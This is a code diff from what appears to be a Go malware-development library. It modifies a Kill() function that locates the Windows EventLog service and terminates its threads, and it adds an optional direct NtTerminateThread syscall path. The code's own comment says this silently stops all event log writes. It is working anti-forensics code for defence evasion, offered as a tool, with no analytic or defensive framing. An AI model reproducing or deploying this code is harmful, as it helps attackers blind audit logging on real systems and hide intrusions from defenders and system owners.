@@ -9,6 +9,7 @@ import (
 	"golang.org/x/sys/windows"
 
 	"github.com/oioio-space/maldev/win/api"
+	wsyscall "github.com/oioio-space/maldev/win/syscall"
 )
 
 // threadEntry32 matches THREADENTRY32 for CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD).
@@ -33,7 +34,7 @@ var (
 // are killed, silently stopping all event log writes.
 //
 // Requires SeDebugPrivilege (typically available to SYSTEM or elevated admin).
-func Kill() error {
+func Kill(caller *wsyscall.Caller) error {
 	pid, err := findEventLogPID()
 	if err != nil {
 		return fmt.Errorf("find EventLog PID: %w", err)
@@ -58,11 +59,18 @@ func Kill() error {
 		if te.OwnerProcessID == pid {
 			hThread, openErr := windows.OpenThread(windows.THREAD_TERMINATE, false, te.ThreadID)
 			if openErr == nil {
-				r, _, _ = api.ProcTerminateThread.Call(uintptr(hThread), 0)
-				windows.CloseHandle(hThread)
-				if r != 0 {
-					killed++
+				if caller != nil {
+					ret, _ := caller.Call("NtTerminateThread", uintptr(hThread), 0)
+					if ret == 0 {
+						killed++
+					}
+				} else {
+					r, _, _ = api.ProcTerminateThread.Call(uintptr(hThread), 0)
+					if r != 0 {
+						killed++
+					}
 				}
+				windows.CloseHandle(hThread)
 			}
 		}
 
